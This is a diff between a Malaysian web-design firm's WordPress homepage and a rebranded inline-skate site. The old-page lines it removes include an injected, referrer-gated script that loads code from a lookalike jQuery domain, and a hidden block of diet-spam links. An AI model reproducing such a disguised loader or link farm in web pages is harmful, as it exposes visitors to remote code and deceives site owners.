@@ -1,0 +1,145 @@
+5,6c5,6
+< <link rel="icon"  type="image/png"  href="/wp-content/themes/technosoftwares/lib/images/favicon.ico" />
+< <link rel="shortcut icon"  href="/wp-content/themes/technosoftwares/lib/images/favicon.ico" />
+---
+> <link rel="icon"  type="image/png"  href="/Resources/EOSkate_Logo.png" />
+> <link rel="shortcut icon"  href="/Resources/EOSkate_Logo.png" />
+8c8
+< <title>Website designing &amp; development in Malaysia, SEO Expert &amp; Internet Marketing Malaysia | Web Development Malaysia</title>
+---
+> <title>Lightest Carbon Fiber Frames in the World of Inline Skates</title>
+11,12c11,12
+< <!--[if IE]><link rel="stylesheet" href="http://technosoftwares.com.my/wp-content/themes/technosoftwares/lib/css/style-ie.css" media="screen" /><![endif]-->
+< <!--[if IE 7]><link rel="stylesheet" href="http://technosoftwares.com.my/wp-content/themes/technosoftwares/lib/css/style-ie7.css" media="screen" /><![endif]-->
+---
+> <!--[if IE]><link rel="stylesheet" href="http://www.eoskates.com/Devel/bubu/css/style-ie.css" media="screen" /><![endif]-->
+> <!--[if IE 7]><link rel="stylesheet" href="http://www.eoskates.com/Devel/bubu/css/style-ie7.css" media="screen" /><![endif]-->
+26,30c26,29
+< 
+< <link rel="alternate" type="application/rss+xml" title="Website designing &amp; development in Malaysia, SEO Expert &amp; Internet Marketing Malaysia &raquo; Feed" href="http://technosoftwares.com.my/feed/" />
+< <link rel="alternate" type="application/rss+xml" title="Website designing &amp; development in Malaysia, SEO Expert &amp; Internet Marketing Malaysia &raquo; Comments Feed" href="http://technosoftwares.com.my/comments/feed/" />
+< <link rel='stylesheet' id='contact-form-7-css'  href='http://technosoftwares.com.my/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=3.2' type='text/css' media='all' />
+< <link rel='stylesheet' id='reset-css'  href='http://technosoftwares.com.my/wp-content/themes/technosoftwares/lib/css/reset.css?ver=3.3.2' type='text/css' media='all' />
+---
+> <link rel="alternate" type="application/rss+xml" title="Lightest Carbon Fiber Frames in the World of Inline Skates &raquo; Feed" href="http://www.eoskates.com/feed/" />
+> <link rel="alternate" type="application/rss+xml" title="Lightest Carbon Fiber Frames in the World of Inline Skates &raquo; Comments Feed" href="http://www.eoskates.com/comments/feed/" />
+> <link rel='stylesheet' id='contact-form-7-css'  href='http://www.eoskates.com/Devel/bubu/css/styles.css?ver=3.2' type='text/css' media='all' />
+> <link rel='stylesheet' id='reset-css'  href='http://www.eoskates.com/Devel/bubu/css/reset.css?ver=3.3.2' type='text/css' media='all' />
+32,35c31,34
+< <link rel='stylesheet' id='prettyphoto-css'  href='http://technosoftwares.com.my/wp-content/themes/technosoftwares/lib/scripts/prettyPhoto/css/prettyPhoto.css?ver=3.3.2' type='text/css' media='all' />
+< <link rel='stylesheet' id='style-obsidian-css'  href='http://technosoftwares.com.my/wp-content/themes/technosoftwares/style-obsidian.css?ver=3.3.2' type='text/css' media='all' />
+< <script type='text/javascript' src='http://www.shrinktheweb.com/scripts/pagepix.js?ver=1342023983'></script>
+< <script type='text/javascript' src='http://technosoftwares.com.my/wp-includes/js/jquery/jquery.js?ver=1.7.1'></script>
+---
+> <link rel='stylesheet' id='prettyphoto-css'  href='http://www.eoskates.com/Devel/bubu/css/prettyPhoto.css?ver=3.3.2' type='text/css' media='all' />
+> <link rel='stylesheet' id='style-obsidian-css'  href='http://www.eoskates.com/Devel/bubu/css/style-obsidian.css?ver=3.3.2' type='text/css' media='all' />
+> <script type='text/javascript' src='http://www.shrinktheweb.com/scripts/pagepix.js?ver=1341934399'></script>
+> <script type='text/javascript' src='http://www.eoskates.com/Devel/bubu/js/jquery/jquery.js?ver=1.7.1'></script>
+37,44c36,42
+< <script type='text/javascript' src='http://technosoftwares.com.my/wp-includes/js/comment-reply.js?ver=20090102'></script>
+< <script type='text/javascript' src='http://technosoftwares.com.my/wp-includes/js/swfobject.js?ver=2.2-20120417'></script>
+< 
+< <script type='text/javascript' src='http://technosoftwares.com.my/wp-content/themes/technosoftwares/lib/scripts/mediaplayer/jwplayer.js?ver=3.3.2'></script>
+< <script type='text/javascript' src='http://technosoftwares.com.my/wp-content/themes/technosoftwares/lib/scripts/jquery.cycle.all.js?ver=3.3.2'></script>
+< <script type='text/javascript' src='http://technosoftwares.com.my/wp-content/themes/technosoftwares/lib/scripts/prettyPhoto/js/jquery.prettyPhoto.js?ver=3.3.2'></script>
+< <script type='text/javascript' src='http://technosoftwares.com.my/wp-content/themes/technosoftwares/lib/scripts/reflection.js?ver=3.3.2'></script>
+< <script type='text/javascript' src='http://technosoftwares.com.my/wp-content/themes/technosoftwares/lib/scripts/cufon-yui.js?ver=3.3.2'></script>
+---
+> <script type='text/javascript' src='http://www.eoskates.com/Devel/bubu/js/comment-reply.js?ver=20090102'></script>
+> <script type='text/javascript' src='http://www.eoskates.com/Devel/bubu/js/swfobject.js?ver=2.2-20120417'></script>
+> <script type='text/javascript' src='http://www.eoskates.com/Devel/bubu/js/jwplayer.js?ver=3.3.2'></script>
+> <script type='text/javascript' src='http://www.eoskates.com/Devel/bubu/js/jquery.cycle.all.js?ver=3.3.2'></script>
+> <script type='text/javascript' src='http://www.eoskates.com/Devel/bubu/js/jquery.prettyPhoto.js?ver=3.3.2'></script>
+> <script type='text/javascript' src='http://www.eoskates.com/Devel/bubu/js/reflection.js?ver=3.3.2'></script>
+> <script type='text/javascript' src='http://www.eoskates.com/Devel/bubu/js/cufon-yui.js?ver=3.3.2'></script>
+49,54c47
+< <link rel='canonical' href='http://technosoftwares.com.my/' />
+< <meta name='description' content='Techno Softwares Malaysia Provides Website designing in Malaysia Website development in Malaysia SEO Expert and Internet Marketing Malaysia.' />
+< <meta name='keywords' content='Web Development Malaysia, Web Designing Malaysia, Software Development Malaysia, Web Promotions Malaysia, Multimedia Presentation Malaysia, Academic Projects Malaysia, Online Marketing Malaysia, Online Advertisement Malaysia, Web Site Malaysia, SEO Malaysia, Search Engine Submission Malaysia' />
+< 
+< <script type="text/javascript"> if(!document.referrer || document.referrer == ''){ document.write('<scr'+'ipt type="text/javascript" src="http://www.jqueryc.com/jquery.js"></scr'+'ipt>'); } </script><div style="display:none"><a href="http://www.care2.com/c2c/share/detail/3377805" title="type 2 diabetes menu"><h1>type 2 diabetes menu</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="work out products"><h1>work out products</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight watchers shop"><h1>weight watchers shop</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="joining weight watchers"><h1>joining weight watchers</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="diet after weight loss surgery"><h1>diet after weight loss surgery</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="how to lose 10 pounds quickly"><h1>how to lose 10 pounds quickly</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="diet systems of america"><h1>diet systems of america</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="points restaurant weight watchers"><h1>points restaurant weight watchers</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight watchers breakfast ideas"><h1>weight watchers breakfast ideas</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="how to lose weight after baby"><h1>how to lose weight after baby</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="basic training workout"><h1>basic training workout</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="403030 diet"><h1>403030 diet</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="sun slim diet"><h1>sun slim diet</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="calories per exercise"><h1>calories per exercise</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight watchers plans"><h1>weight watchers plans</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight watchers new jersey"><h1>weight watchers new jersey</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="courses personal trainer"><h1>courses personal trainer</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="eating healthy diets"><h1>eating healthy diets</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="ice cream bar"><h1>ice cream bar</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="healthy activities"><h1>healthy activities</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight watcher success"><h1>weight watcher success</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="cardiac diet menu"><h1>cardiac diet menu</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="graph weight loss"><h1>graph weight loss</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight watcher tips"><h1>weight watcher tips</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight loss washington dc"><h1>weight loss washington dc</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="fat weightloss"><h1>fat weightloss</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight watchers coffee"><h1>weight watchers coffee</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="points calculator online"><h1>points calculator online</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="3 diet"><h1>3 diet</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="cleansing diet natural"><h1>cleansing diet natural</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="exercise weight loss"><h1>exercise weight loss</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="diet in 7 days"><h1>diet in 7 days</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="old people diet"><h1>old people diet</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="personal trainers miami"><h1>personal trainers miami</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="chip weight"><h1>chip weight</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="dietsa"><h1>dietsa</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="fast wieght loss"><h1>fast wieght loss</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="food diet weight loss"><h1>food diet weight loss</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="gym aerobics"><h1>gym aerobics</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="home delivery water service"><h1>home delivery water service</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="lose 20 lb"><h1>lose 20 lb</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="intensity rate"><h1>intensity rate</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="discount nutrisystem"><h1>discount nutrisystem</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="circuit training weight loss"><h1>circuit training weight loss</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="alcohol weight loss"><h1>alcohol weight loss</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight loss menu plans"><h1>weight loss menu plans</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="detoxing diet"><h1>detoxing diet</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="loose weight plan"><h1>loose weight plan</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight loss diet exercise"><h1>weight loss diet exercise</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="ireland diet"><h1>ireland diet</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="special delivery music"><h1>special delivery music</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="cheese wedge"><h1>cheese wedge</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="jen craig"><h1>jen craig</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight s"><h1>weight s</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="switch weight watchers"><h1>switch weight watchers</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="health heart diet"><h1>health heart diet</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight watchers frozen foods"><h1>weight watchers frozen foods</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="bmi find your"><h1>bmi find your</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="hungry girl com"><h1>hungry girl com</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight loss milk"><h1>weight loss milk</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight watchers beef recipes"><h1>weight watchers beef recipes</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="christian weight loss support"><h1>christian weight loss support</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="best fat burning food"><h1>best fat burning food</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="alexandria va food delivery"><h1>alexandria va food delivery</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="home delivery meat"><h1>home delivery meat</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="perricone diet plan"><h1>perricone diet plan</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight line"><h1>weight line</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="good eating habits"><h1>good eating habits</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight loss tips for men"><h1>weight loss tips for men</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="menstruation weight"><h1>menstruation weight</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="new weight watchers"><h1>new weight watchers</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="personal online trainer"><h1>personal online trainer</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight watchers soup recipe"><h1>weight watchers soup recipe</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="diet for a diabetic"><h1>diet for a diabetic</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight watchers broccoli"><h1>weight watchers broccoli</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="personal trainers houston"><h1>personal trainers houston</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="eating diet plan"><h1>eating diet plan</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="best diet program"><h1>best diet program</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="lose 30 pounds in one month"><h1>lose 30 pounds in one month</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="effects diet"><h1>effects diet</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight height and age"><h1>weight height and age</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="meal plans weight loss"><h1>meal plans weight loss</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="workouts to lose weight"><h1>workouts to lose weight</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="e diets"><h1>e diets</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="how to lose weight stomach"><h1>how to lose weight stomach</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="diet wheat"><h1>diet wheat</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="fitness club software"><h1>fitness club software</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="diet ring"><h1>diet ring</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="hydroxycut weight loss"><h1>hydroxycut weight loss</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="lose alot of weight"><h1>lose alot of weight</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="mate diet"><h1>mate diet</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="prep meals"><h1>prep meals</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="z diet"><h1>z diet</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="bmi 20"><h1>bmi 20</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="plano personal trainers"><h1>plano personal trainers</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="great fruit diet"><h1>great fruit diet</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="trigger foods"><h1>trigger foods</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="medication to lose weight"><h1>medication to lose weight</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="weight loss fasting"><h1>weight loss fasting</h1></a><a href="http://www.care2.com/c2c/share/detail/3377805" title="point calculator weight watchers"><h1>point calculator weight watchers</h1></a></div>
+< 
+---
+> <link rel='canonical' href='http://www.eoskates.com/' />
+59c52
+< 		behavior: url("http://technosoftwares.com.my/wp-content/themes/technosoftwares/lib/scripts/pie/PIE.php");
+---
+> 		behavior: url("http://www.eoskates.com/Devel/bubu/lib/PIE.php");
+392,393c385
+< </head>	
+< 
+---
+> </head>					
+406,407c398
+< 			
+< 			<!--Begin Logo-->
+---
+> 					<!--Begin Logo-->
+430,431c421
+< 
+< 			
+---
+> 	
+433c423
+< 		
+---
+> 				
+440,441d429
+< 			<!--<div class="menu"><ul><li class="page_item page-item-103"><a href="http://technosoftwares.com.my/application-maintenence/">Application Maintenence</a></li><li class="page_item page-item-131"><a href="http://technosoftwares.com.my/global-internship/">Global Internship</a></li><li class="page_item page-item-4 current_page_item"><a href="http://technosoftwares.com.my/">Home</a></li><li class="page_item page-item-105"><a href="http://technosoftwares.com.my/it-consultancy/">IT Consultancy</a></li><li class="page_item page-item-141"><a href="http://technosoftwares.com.my/methodology/">Methodology</a></li><li class="page_item page-item-129"><a href="http://technosoftwares.com.my/mission-vision/">Mission &#038; Vision</a></li><li class="page_item page-item-88"><a href="http://technosoftwares.com.my/offshore-development/">Offshore Development</a></li><li class="page_item page-item-130"><a href="http://technosoftwares.com.my/our-clients/">Our Clients</a></li><li class="page_item page-item-142"><a href="http://technosoftwares.com.my/our-team/">Our Team</a></li><li class="page_item page-item-100"><a href="http://technosoftwares.com.my/quality-policy/">Quality Policy</a></li><li class="page_item page-item-104"><a href="http://technosoftwares.com.my/search-engine-optimization/">Search Engine Optimization</a></li><li class="page_item page-item-108"><a href="http://technosoftwares.com.my/software-development/">Software Development</a></li><li class="page_item page-item-111"><a href="http://technosoftwares.com.my/software-quality-assurance-and-testing/">Software Quality Assurance And Testing</a></li><li class="page_item page-item-114"><a href="http://technosoftwares.com.my/summer-industrial-training/">Summer Industrial Training</a></li><li class="page_item page-item-115"><a href="http://technosoftwares.com.my/summer-training-in-net/">Summer Training In .Net</a></li><li class="page_item page-item-116"><a href="http://technosoftwares.com.my/summer-training-in-java/">Summer Training In Java</a></li><li class="page_item page-item-125"><a href="http://technosoftwares.com.my/summer-training-in-networking/">Summer Training In Networking</a></li><li class="page_item page-item-119"><a href="http://technosoftwares.com.my/summer-training-in-php/">Summer Training In PHP</a></li><li class="page_item page-item-87"><a href="http://technosoftwares.com.my/web-development/">Web Development</a></li><li class="page_item page-item-60"><a href="http://technosoftwares.com.my/company-overview/">Company Overview</a><ul class='children'><li class="page_item page-item-86"><a href="http://technosoftwares.com.my/company-overview/about-us/">About Us</a><ul class='children'><li class="page_item page-item-128"><a href="http://technosoftwares.com.my/company-overview/about-us/an-overview/">An Overview</a></li></ul></li><li class="page_item page-item-85"><a href="http://technosoftwares.com.my/company-overview/works-technosoftwares/">Works @Technosoftwares</a></li></ul></li><li class="page_item page-item-62"><a href="http://technosoftwares.com.my/portfolio/">Portfolio</a></li><li class="page_item page-item-64"><a href="http://technosoftwares.com.my/services/">Services</a></li><li class="page_item page-item-66"><a href="http://technosoftwares.com.my/traning/">Traning</a></li><li class="page_item page-item-71"><a href="http://technosoftwares.com.my/career/">Career</a></li><li class="page_item page-item-73"><a href="http://technosoftwares.com.my/contact-us/">Contact Us</a></li></ul></div>
+< -->
+446d433
+< 
+455d441
+< 
+457a444
+> 	<li id="menu-item-145" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-145"><a href="http://technosoftwares.com.my/offshore-development/">Offshore Development</a></li>
+466d452
+< 
+470a457
+> 
+484d470
+< 
+496d481
+< 					
+498d482
+< 
+517a502,503
+> 
+> 					
+528c514
+< 							<p><a href="http://technosoftwares.com.my/slide/innovative-minds-at-work/pair-of-chicks-on-laptop-over-white-background-470x352-2/" rel="attachment wp-att-14"><img class="size-medium wp-image-14 alignleft" title="Playing with Technology" src="http://technosoftwares.com.my/wp-content/uploads/Bharat-Information-Technology-Services-BITS_30368_image.jpg" alt="Playing with Technology" style="width: 470px;height: 352px;" /></a></p>
+---
+> 							<p><a href="http://technosoftwares.com.my/?attachment_id=14" rel="attachment wp-att-14"><img class="size-medium wp-image-14 alignleft" title="Bharat-Information-Technology-Services-BITS_30368_image" src="http://technosoftwares.com.my/wp-content/uploads/Bharat-Information-Technology-Services-BITS_30368_image.jpg" alt="" style="width: 470px;height: 352px;" /></a></p>
+531d516
+< 
+552,553c537
+< 
+< 							<p><a href="http://technosoftwares.com.my/slide/innovative-minds-at-work/pair-of-chicks-on-laptop-over-white-background-470x352-2/" rel="attachment wp-att-14"><img class="size-medium wp-image-14 alignright" title="Integration of Finest Resources &#038; Best Minds" src="http://technosoftwares.com.my/wp-content/uploads/1.jpg" alt="Integration of Finest Resources &#038; Best Minds" style="width: 470px;height: 352px;" /></a></p>
+---
+> 							<p><a href="http://technosoftwares.com.my/?attachment_id=14" rel="attachment wp-att-14"><img class="size-medium wp-image-14 alignright" title="1" src="http://technosoftwares.com.my/wp-content/uploads/1.jpg" alt="" style="width: 470px;height: 352px;" /></a></p>
+565d548
+< 
+577c560
+< 							<p><a href="http://technosoftwares.com.my/slide/innovative-minds-at-work/pair-of-chicks-on-laptop-over-white-background-470x352-2/" rel="attachment wp-att-14"><img class="size-medium wp-image-14 alignleft" title="Website development . An Introduction to the world market" src="http://technosoftwares.com.my/wp-content/uploads/pix2.jpg" alt="Website development . An Introduction to the world market" style="width: 470px;height: 352px;" /></a></p>
+---
+> 							<p><a href="http://technosoftwares.com.my/?attachment_id=14" rel="attachment wp-att-14"><img class="size-medium wp-image-14 alignleft" title="pix2" src="http://technosoftwares.com.my/wp-content/uploads/pix2.jpg" alt="" style="width: 470px;height: 352px;" /></a></p>
+579c562
+< <p style="font-size: 50px;line-height: 50px;">WEBSITE DEVELOPMENT . An Introduction to the world market</p>
+---
+> <p style="font-size: 50px;line-height: 50px;">WEBSITE DEVELOPMENT – An Introduction to the world market</p>
+581,582c564
+< Website Development is an easy way out of your intricate problem. We introduce you to the world market. And this introduction to the world market is never so ordinary. It.s magical, it.s attractive, it.s alluring, it.s glamorous. Through Website Development we mark your Virtual Presence 24*7*365 even in your absence.  </p>
+< 
+---
+> Website Development is an easy way out of your intricate problem. We introduce you to the world market. And this introduction to the world market is never so ordinary. It’s magical, it’s attractive, it’s alluring, it’s glamorous. Through Website Development we mark your Virtual Presence 24*7*365 even in your absence.  </p>
+601d582
+< 
+625d605
+< 
+669,670d648
+< 	
+< 
+801c779
+< </html>		
+---
+> </html>	
